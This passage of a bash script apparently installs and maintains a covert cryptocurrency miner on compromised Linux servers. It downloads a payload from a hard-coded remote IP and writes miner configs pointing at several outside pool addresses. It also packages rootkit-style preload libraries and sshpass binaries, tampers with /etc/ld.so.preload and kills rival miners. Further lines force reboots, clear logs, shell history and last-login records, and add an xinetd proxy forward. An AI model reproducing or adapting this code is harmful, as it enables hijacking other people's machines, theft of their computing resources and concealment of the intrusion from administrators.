            exec 3<>/dev/tcp/${HOST}/$PORT
            echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
            (while read line; do
                [[ "$line" == $'\r' ]] && break
            done && cat) <&3
            exec 3>&-
        }
        if command -v wget &> /dev/null; then
            test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        elif command -v curl &> /dev/null; then
            test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        else
            test=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        fi
        if [[ "$test" -eq 480045 ]]; then
            echo $"${base} is running..."
            return 0
        elif [ ! -z "$test" ]; then
            echo $"${base} is running..."
            return 0
        else
            echo $"${base} dead but subsys locked"
            return 2
        fi
    fi

    echo $"${base} is stopped"
    return 3
}
EOF
		else
			cat <<'EOF' >/etc/init.d/status
statusfit() {
    local pidfile daemon name status

    pidfile=
    OPTIND=1
    while getopts p: opt; do
        case "$opt" in
        p) pidfile="$OPTARG" ;;
        esac
    done
    shift $(($OPTIND - 1))

    if [ -n "$pidfile" ]; then
        pidfile="-p $pidfile"
    fi
    daemon="$1"
    name="$2"

    status="0"
    pidofproc $pidfile $daemon >/dev/null || status="$?"
    if [ "$status" = 0 ]; then
        log_success_msg "$name is running"
        return 0
    elif [ "$status" = 4 ]; then
        if command -v wget &> /dev/null; then
            test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        elif command -v curl &> /dev/null; then
            test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        else
            exec 3<>"/dev/tcp/127.0.0.1/999"
            if [ $? -ne 0 ]; then
                unset test
            fi
        fi
        if [ ! -z "$test" ]; then
            log_success_msg "$name is running"
            return 0
        else
            log_failure_msg "could not access PID file for $name"
            return $status
        fi
    else
        if command -v wget &> /dev/null; then
            test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        elif command -v curl &> /dev/null; then
            test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
        else
            exec 3<>"/dev/tcp/127.0.0.1/999"
            if [ $? -ne 0 ]; then
                unset test
            fi
        fi
        if [ ! -z "$test" ]; then
            log_success_msg "$name is running"
            return 0
        else
            log_failure_msg "$name is not running"
            return $status
        fi
    fi
}
EOF
		fi

		if command -v wget &>/dev/null; then
			Diff=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
			HASHRATE=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | grep -A1 "hashrate" | sed 's/"hashrate": {//g' | sed -e '/^ *$/d' | sed 's/"total": //g' | sed 's/ \{1,\}/ /g' | sed -e 's/,$//')
		elif command -v curl &>/dev/null; then
			HASHRATE=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | grep -A1 "hashrate" | sed 's/"hashrate": {//g' | sed -e '/^ *$/d' | sed 's/"total": //g' | sed 's/ \{1,\}/ /g' | sed -e 's/,$//')
			Diff=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
		else
			HASHRATE=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | grep -A1 "hashrate" | sed 's/"hashrate": {//g' | sed -e '/^ *$/d' | sed 's/"total": //g' | sed 's/ \{1,\}/ /g' | sed -e 's/,$//')
			Diff=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
		fi
		if [[ "$Diff" -eq 480045 ]]; then
			SKIPINSTALL=true
			ALREADYINSTALL=true
			if [[ $HASHRATE == *'null, null, null'* ]]; then
				SKIPINSTALL=false
				ALREADYINSTALL=false
			fi
		fi
		# Check $FILE_NAME Status:
		echo "Create tar archive"
		############################
		USERPATH="/var/spirit/tar
    /var/spirit/tar/root
    /var/spirit/tar/etc
    /var/spirit/tar/usr/local/lib
    /var/spirit/tar/usr/spirit
    /var/spirit/tar/etc/opt
    /var/spirit/tar/etc/cron.daily
    /var/spirit/tar/etc/libnl
    /var/spirit/tar/etc/postfix
    /var/spirit/tar/home/lib
    /var/spirit/tar/home/lib64
    /var/spirit/tar/sbin/gcc
    /var/spirit/tar/var/kernel
    /var/spirit/tar/var/log
    /var/spirit/tar/var/crash
    /var/spirit/tar/mnt
    /var/spirit/tar/root/$PATH_NAME"
		echo "$USERPATH" | while IFS= read -r line; do
			if [ ! -d $line ]; then
				mkdir -p $line >/dev/null 2>&1
			fi
		done
		USERFILE="root/$PATH_NAME/xfitaarch.sh
root/$PATH_NAME/timeoutaarch
root/$PATH_NAME/xfit.sh
root/$PATH_NAME/timeout64
root/$PATH_NAME/ip.txt
root/$PATH_NAME/$FILE_NAME
etc/cron.daily/xbash
usr/$FILE_REZ
usr/local/lib/pkit.so
usr/local/lib/fkit.so
usr/local/lib/skit.so
usr/local/lib/sshkit.so
usr/local/lib/sshpkit.so
usr/local/lib/pkitarm.so
usr/local/lib/fkitarm.so
usr/local/lib/skitarm.so
usr/local/lib/sshkitarm.so
usr/local/lib/sshpkitarm.so
usr/spirit/spirit
usr/spirit/spirit-arm
usr/spirit/sshpass
usr/spirit/alllib
usr/spirit/sshpass-arm
usr/spirit/ip.txt
usr/spirit/spirit.sh
usr/spirit/typical
usr/spirit/gclib
etc/opt/gcc_y
etc/libnl/gcc_y
etc/postfix/gcc_y
home/lib/gcc_y
home/lib64/gcc_y
sbin/gcc_y
var/kernel/gcc_y
var/log/gcc_y
var/crash/gcc_y
mnt/gcc_y
root/$PATH_NAME/gcc_y
etc/opt/gcc_p
etc/libnl/gcc_p
etc/postfix/gcc_p
home/lib/gcc_p
home/lib64/gcc_p
sbin/gcc_p
var/kernel/gcc_p
var/log/gcc_p
var/crash/gcc_p
mnt/gcc_p
root/$PATH_NAME/gcc_p"
		echo "$USERFILE" | while IFS= read -r line; do
			if [ -f /$line ]; then
				\cp /$line /var/spirit/tar/$line >/dev/null 2>&1
			fi
		done

		cd /var/spirit/tar
		tar -zcf /etc/lib/${FILE_NAME}.tar.gz "root/$PATH_NAME" "root/$PATH_NAME/$FILE_NAME" "etc/cron.daily/xbash" "usr/$FILE_REZ" "usr/local/lib/pkit.so" \
			"usr/local/lib/fkit.so" "usr/local/lib/skit.so" "usr/local/lib/sshkit.so" "usr/local/lib/sshpkit.so" "usr/spirit/spirit" "usr/spirit/spirit-arm" \
			"usr/local/lib/sshkitarm.so" "usr/local/lib/sshpkitarm.so" "usr/spirit/sshpass" "usr/spirit/sshpass-arm" "usr/spirit/ip.txt" "usr/spirit/spirit.sh" \
			"usr/spirit/typical" "usr/spirit/gclib" "usr/local/lib/pkitarm.so" "usr/local/lib/fkitarm.so" "usr/local/lib/skitarm.so" "etc/opt/$GCC_FILE" "etc/libnl/$GCC_FILE" \
			"etc/postfix/$GCC_FILE" "home/lib/$GCC_FILE" "home/lib64/$GCC_FILE" "sbin/$GCC_FILE" "var/kernel/$GCC_FILE" "var/log/$GCC_FILE" "var/crash/$GCC_FILE" "mnt/$GCC_FILE" \
			"root/$PATH_NAME/$GCC_FILE" "usr/spirit/alllib"
		cd /
		############################
		if [ "$SKIPINSTALL" == true ]; then
			if [ "$ALREADYINSTALL" == true ]; then
				echo
				if command -v wget &>/dev/null; then
					TESTPOOL=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | LC_ALL=en_US.utf8 grep -m1 -oP '"pool"\s*:\s*"\K[^"]+')
					HASHRATE=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | grep -A1 "hashrate" | sed 's/"hashrate": {//g' | sed -e '/^ *$/d' | sed 's/"total": //g' | sed 's/ \{1,\}/ /g' | sed -e 's/,$//')
					Diff=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
				elif command -v curl &>/dev/null; then
					TESTPOOL=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | LC_ALL=en_US.utf8 grep -m1 -oP '"pool"\s*:\s*"\K[^"]+')
					HASHRATE=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | grep -A1 "hashrate" | sed 's/"hashrate": {//g' | sed -e '/^ *$/d' | sed 's/"total": //g' | sed 's/ \{1,\}/ /g' | sed -e 's/,$//')
					Diff=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
				else
					TESTPOOL=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | LC_ALL=en_US.utf8 grep -m1 -oP '"pool"\s*:\s*"\K[^"]+')
					HASHRATE=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | grep -A1 "hashrate" | sed 's/"hashrate": {//g' | sed -e '/^ *$/d' | sed 's/"total": //g' | sed 's/ \{1,\}/ /g' | sed -e 's/,$//')
					Diff=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
				fi

				echo -e "Pool - \e[32m$TESTPOOL\e[0m"
				echo -e "HASHRATE - \e[32m$HASHRATE\e[0m"
				echo -e "Diff - \e[32m$Diff\e[0m"
				sleep 3
				InfoR "Skip install. Already install"
				echo
			else
				echo
				InfoR "Skip install. No $CHECKARCH support"
				echo
			fi
		else
			if [ -d /root/.xfit ]; then
				rm -fr /etc/cron.hourly/crontab >/dev/null 2>&1
				rm -fr /etc/xtab/crontab >/dev/null 2>&1
				pkill -9 xfit >/dev/null 2>&1
				pkill -9 xfitaarch >/dev/null 2>&1
				rm -fr /root/.xfit >/dev/null 2>&1
				rm -fr /etc/alternatives/.xfit >/dev/null 2>&1
				rm -fr /etc/init.d/xfit >/dev/null 2>&1
				rm -fr /etc/cron.hourly/.crontab >/dev/null 2>&1
				rm -fr /etc/xtab/.crontab >/dev/null 2>&1
				rm -fr /etc/cron.hourly/.somescript1 >/dev/null 2>&1
				rm -fr /etc/xtab/.somescript1 >/dev/null 2>&1
				rm -fr /etc/init.d/xfit >/dev/null 2>&1
			fi
			if [ -d /root/.warmup ]; then
				rm -fr /etc/cron.hourly/somescript >/dev/null 2>&1
				rm -fr /etc/xtab/somescript >/dev/null 2>&1
				service warmup stop
				pkill -9 $warmupfile >/dev/null 2>&1
				rm -fr /root/.$warmupfile >/dev/null 2>&1
				rm -fr /etc/alternatives/.$warmupfile >/dev/null 2>&1
				rm -fr /etc/init.d/warmup >/dev/null 2>&1
				rm -fr /etc/cron.hourly/.somescript >/dev/null 2>&1
				rm -fr /etc/xtab/.somescript >/dev/null 2>&1
				rm -fr /etc/cron.hourly/.somescript1 >/dev/null 2>&1
				rm -fr /etc/xtab/.somescript1 >/dev/null 2>&1
			fi
			if [ -d /root/xfit ]; then
				service xfit stop >/dev/null 2>&1
				pkill -9 xfit >/dev/null 2>&1
				rm -fr /usr/lib/local/xfit_res.sh >/dev/null 2>&1
				rm -fr /root/xfit >/dev/null 2>&1
				rm -fr /etc/cron.hourly/bash >/dev/null 2>&1
				rm -fr /etc/xtab >/dev/null 2>&1
				rm -fr /etc/alternatives/xfit >/dev/null 2>&1
				rm -fr /usr/xfit_cron.sh >/dev/null 2>&1
				rm -fr /etc/lib/anacron.tar >/dev/null 2>&1
				rm -fr /etc/init.d/xfit >/dev/null 2>&1
			fi

			systemctl >/dev/null 2>&1
			if [[ $? -eq 0 ]]; then
				isSystemctl=true
			else
				isSystemctl=false
			fi
			if [ "$isSystemctl" == true ]; then
				BackActive=false
				systemctl is-active $SERVICE_NAME >/dev/null 2>&1
			else
				BackActive=true
				service $SERVICE_NAME status >/dev/null 2>&1

			fi
			if [[ $? -eq 0 ]]; then
				InfoP "Service $SERVICE_NAME Active, checking..."
				if command -v wget &>/dev/null; then
					test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
				elif command -v curl &>/dev/null; then
					test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
				else
					test=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
				fi
				if [[ "$test" -eq 480045 ]]; then
					if [[ $HASHRATE == *'null, null, null'* ]]; then
						InfoR "Serice $SERVICE_NAME running, but not connected, trying fix it"
						checkwork=false
					else
						InfoG "Serice $SERVICE_NAME running"
						checkwork=true
					fi
				else
					InfoR "Serice $SERVICE_NAME running, but not connected, trying fix it"
					checkwork=false
				fi
			else
				checkwork=false
			fi

			if [ "$checkwork" == true ]; then
				InfoG "All service work fine"
			else
				if [ "$isSystemctl" == true ]; then
					systemctl stop $SERVICE_NAME >/dev/null 2>&1
				else
					service $SERVICE_NAME stop >/dev/null 2>&1
				fi
				#####Check and Download
				if [ -f /root/$PATH_NAME/$FILE_NAME ]; then
					InfoG "File $FILE_NAME exists"
				else
					cd /root/$PATH_NAME || exit
					THISDIR=/root/$PATH_NAME
					if [ $(arch) == "aarch64" ]; then
						DOWNLOAD_FILE_NAME="xfitaarch"
						HASH="ea21c93c8093bef1c5745d11cce3853c"
					else
						DOWNLOAD_FILE_NAME="xfit"
						HASH="721f883ecb7c6d1c3318aeeabbc57ed9"
					fi
					FILENAME="$FILE_NAME"
					FILE_URL="http://5.133.65.53/soft/linux/${DOWNLOAD_FILE_NAME}.sh"
					EXISTING_SHELL_SCRIPT_FILE="${THISDIR}/$FILE_NAME"
					get_remote_file "${FILE_URL}" "${EXISTING_SHELL_SCRIPT_FILE}"
					\cp /root/$PATH_NAME/$FILE_NAME /root/$PATH_NAME/$DOWNLOAD_FILE_NAME.sh >/dev/null 2>&1
					unset HASH
				fi
				######################################
				#if [ -f /root/$PATH_NAME/config.json ]; then
				#	CONF=$(cat /root/$PATH_NAME/config.json)
				#	if [[ $CONF == *14444* ]]; then
				#		USR=0
				#	else
				#		USR=1
				#	fi
				#	if [[ $CONF == *24444* ]]; then
				#		USR=1
				#	else
				#		USR=0
				#	fi
				#fi
				if [[ $USR -ne 0 ]]; then
					MINEIP=5.133.65.55
					MINEPORT=24444
				else
					MINEIP=5.133.65.54
					MINEPORT=14444
				fi
				InfoP "Test if reboot needed..."
				cat <<EOF >/root/$PATH_NAME/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 999,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": $BackActive,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 5,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$MINEIP:80",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        },
		{
            "algo": null,
            "coin": null,
            "url": "5.133.65.53:$MINEPORT",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
		,
		{
            "algo": null,
            "coin": null,
            "url": "5.133.65.54:$MINEPORT",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
		,
		{
            "algo": null,
            "coin": null,
            "url": "5.133.65.55:$MINEPORT",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
		,
		{
            "algo": null,
            "coin": null,
            "url": "5.133.65.56:$MINEPORT",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 3,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
				chmod 755 /root/$PATH_NAME/$FILE_NAME /dev/null 2>&1
				cd /root/$PATH_NAME || exit
				if [ -f /etc/ld.so.preload ]; then
					REEDLD=$(cat /etc/ld.so.preload)
					if [[ $REEDLD == *kit.so* ]] || [[ $REEDLD == *arm.so* ]]; then
						TESTLD=1
					else
						unset TESTLD
					fi
				else
					unset TESTLD
				fi
				if [ ! -z "$TESTLD" ]; then
					if command -v wget &>/dev/null; then
						Diff=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
					elif command -v curl &>/dev/null; then
						Diff=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
					else
						Diff=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
					fi
					if [ -z "$Diff" ]; then
						service $SERVICE_NAME start >/dev/null 2>&1 &
						sleep 10
						if command -v wget &>/dev/null; then
							Diff=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
						elif command -v curl &>/dev/null; then
							Diff=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
						else
							Diff=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
						fi
						if [ -z "$Diff" ]; then
							chattr -aui /etc/ld.so.preload >/dev/null 2>&1
							cat /dev/null >/etc/ld.so.preload
							InfoR "LD temporarily disabled"
						fi
					fi
				fi

				if [ -f /etc/ld.so.preload ]; then
					REEDLD=$(cat /etc/ld.so.preload)
					if [[ $REEDLD == *kit.so* ]] || [[ $REEDLD == *arm.so* ]]; then
						TESTLD=1
					else
						unset TESTLD
					fi
				else
					unset TESTLD
				fi
				if [ ! -z "$TESTLD" ]; then
					if command -v wget &>/dev/null; then
						Diff=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
					elif command -v curl &>/dev/null; then
						Diff=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
					else
						Diff=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
					fi
					LD=true
				else
					./$FILE_NAME >/dev/null 2>&1 &
					LD=false
				fi
				sleep 10
				if [ "$LD" == false ]; then
					ps cax | grep $FILE_NAME
					if [[ $? -ne 0 ]]; then
						if [ $(arch) == "aarch64" ]; then
							\cp /root/$PATH_NAME/xfitaarch.sh /root/$PATH_NAME/$FILE_NAME >/dev/null 2>&1
						else
							\cp /root/$PATH_NAME/xfit.sh /root/$PATH_NAME/$FILE_NAME >/dev/null 2>&1
						fi
						chmod 755 /root/$PATH_NAME/$FILE_NAME >/dev/null 2>&1
						cd /root/$PATH_NAME || exit
						./$FILE_NAME >/dev/null 2>&1 &
						sleep 10
						ps cax | grep $FILE_NAME
						if [[ $? -ne 0 ]]; then
							unset Diff
						else
							Diff=1
						fi
					else
						Diff=1
					fi
				fi
				if [ -z "$Diff" ]; then
					if [ ! -f /root/$PATH_NAME/reboot ]; then
						: >/root/$PATH_NAME/reboot
						InfoR "Reboot needed. Rebooting..."
						reboot
						if [[ $? -ne 0 ]]; then
							chmod 755 /sbin/shutdown
							shutdown -r now
						fi
					else
						clearLogs
						clearHistory
						disableAuth
						disableHistory
						disableLastLogin
						InfoR "Not starting after reboot.Exit script..."
						pkill -9 $FILE_NAME >/dev/null 2>&1
						exit 0
					fi
				else
					unset Diff
					InfoG "No reboot needed"
					if [ -f /root/$PATH_NAME/reboot ]; then
						rm -fr /root/$PATH_NAME/reboot
					fi
					if [ "$LD" == false ]; then
						pkill -9 $FILE_NAME >/dev/null 2>&1
						sleep 5
					fi
				fi
				#direct connect checking
				cat <<EOF >/root/$PATH_NAME/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 999,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": $BackActive,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 5,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$MINEIP:80",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 3,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
				cd /root/$PATH_NAME || exit
				if [ ! -z "$TESTLD" ]; then
					LD=true
				else
					./$FILE_NAME >/dev/null 2>&1 &
					LD=false
				fi

				sleep 10
				if command -v wget &>/dev/null; then
					test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
				elif command -v curl &>/dev/null; then
					test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
				else
					test=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
				fi
				if [[ "$test" -eq 480045 ]]; then
					InfoG "$MINEIP:80 Work. Add proxy"
					if [ "$LD" == false ]; then
						pkill -9 $FILE_NAME >/dev/null 2>&1
					fi
					cat <<EOF >/etc/xinetd.d/http_forward
service http_forward
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $MINEIP 80
        port            = 703
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
				else
					if [[ $USR -ne 0 ]]; then
						server="5.133.65.53
5.133.65.54
5.133.65.55
5.133.65.56
45.140.146.252"
					else
						server="5.133.65.53
5.133.65.54
5.133.65.55
5.133.65.56
45.67.229.147
45.142.212.30
185.74.222.72
77.247.243.43"
					fi
					echo "$server" | while IFS= read -r line; do
						cat <<EOF >/root/$PATH_NAME/config.json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": true,
        "host": "0.0.0.0",
        "port": 999,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": $BackActive,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 5,
        "asm": true,
        "argon2-impl": null,
        "astrobwt-max-size": 550,
        "astrobwt-avx2": false,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$line:$MINEPORT",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 3,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOF
						cd /root/$PATH_NAME || exit
						if [ ! -z "$TESTLD" ]; then
							LD=true
						else
							./$FILE_NAME >/dev/null 2>&1 &
							LD=false
						fi

						sleep 10
						if command -v wget &>/dev/null; then
							test=$(wget -qO- 127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
						elif command -v curl &>/dev/null; then
							test=$(curl -X GET http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
						else
							test=$(__curl http://127.0.0.1:999/api.json 2>/dev/null | sed -rn 's/.*"diff_current":"?([^",]+)"?.*/\1/p')
						fi
						if [[ "$test" -eq 480045 ]]; then
							InfoG "$line:$MINEPORT Work. Add proxy"
							if [ "$LD" == false ]; then
								pkill -9 $FILE_NAME >/dev/null 2>&1
							fi
							cat <<EOF >/etc/xinetd.d/http_forward
service http_forward
{
        disable         = no
        type            = UNLISTED
        socket_type     = stream
        protocol        = tcp
        user            = nobody
        wait            = no
        redirect        = $line $MINEPORT
        port            = 703
		per_source = UNLIMITED
		instances = UNLIMITED
		cps = 10000 1
}
EOF
							break
						else
							InfoR "$line:$MINEPORT Not Work"
							if [ "$LD" == false ]; then
								pkill -9 $FILE_NAME >/dev/null 2>&1
							fi
						fi
					done
				fi
				##########################

				#Proxy checker
				if [[ $USR -ne 1 ]]; then
					SPOOLS="45.67.229.147:14444
				45.67.229.147:80
				45.67.229.147:443
				45.142.212.30:443
				45.142.212.30:14444
				185.74.222.72:14444
				185.74.222.72:80
				185.74.222.72:443
				77.247.243.43:14444"
					SPECIALPOOL=""
					SPECIALPOOLS=""
					for server in $SPOOLS; do
						SPECIALPOOL=$server
						SPECIALPOOL='{
            "algo": null,
            "coin": null,
            "url": "'$SPECIALPOOL'",
            "user": "LINUXSERVER",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": false,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        },'
						SPECIALPOOLS+=$'\n'$SPECIALPOOL
					done
				else
					SPOOLS="45.140.146.252:24444
				45.140.146.252:80
				45.140.146.252:443"
					SPECIALPOOL=""
					SPECIALPOOLS=""
					for server in $SPOOLS; do
						SPECIALPOOL=$server
						SPECIALPOOL='{
